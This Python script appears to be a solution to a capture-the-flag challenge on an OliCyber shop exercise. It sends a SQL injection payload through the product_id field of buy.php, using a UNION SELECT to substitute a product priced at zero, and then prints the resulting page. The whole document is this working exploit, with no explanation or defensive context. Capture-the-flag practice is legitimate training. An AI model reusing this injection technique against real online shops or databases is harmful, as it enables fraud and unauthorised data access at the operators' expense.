from requests import Session
import urllib.parse

URL = "https://simple-shop.challs.olicyber.it"
s = Session()

s.get(URL)

payload = "1 + 98); -- -' UNION SELECT id, name, 0 AS price FROM products LIMIT 1 OFFSET 2 -- -"
s.post(URL + "/buy.php", headers={"Content-Type":"application/x-www-form-urlencoded"}, data="product_id="+urllib.parse.quote(payload))

print(s.get(URL).text)
